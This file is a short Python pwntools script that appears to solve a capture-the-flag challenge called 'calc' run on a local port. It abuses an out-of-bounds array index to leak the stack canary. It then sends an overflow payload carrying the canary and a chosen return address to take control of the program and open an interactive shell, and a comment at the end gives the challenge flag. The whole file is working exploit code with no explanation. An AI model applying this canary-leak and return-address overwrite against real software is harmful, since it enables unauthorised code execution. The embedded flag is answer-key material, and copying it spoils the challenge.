#!/bin/python3

from pwn import *
context(arch='amd64')
#p=process('./calc')
p=remote("127.0.0.1",40004)
def setnumber(pos,num):
    p.sendlineafter(b"choice:",b"1")
    p.sendlineafter(b"pos:",str(pos))
    p.sendlineafter(b"number:",str(num))

def calc(many):
    p.sendlineafter(b"choice:",b"2")
    p.sendlineafter(b"many?",str(many))

setnumber(-2,24)

for i in range(23):
    setnumber(i,0)

# context.log_level='debug'

calc(24)


p.recvuntil("result:")
canary=int(p.recvuntil('\n'),10)
log.success(hex(canary))

#gdb.attach(p,'b puts')

p.sendline('3')
p.sendlineafter("name?",b'a'*24+p64(canary)+b'b'*8+p64(0x4012bd))
p.interactive()
#MOCSCTF{3adbbe8e-18c6-4da3-8bf9-fe38f154426c}
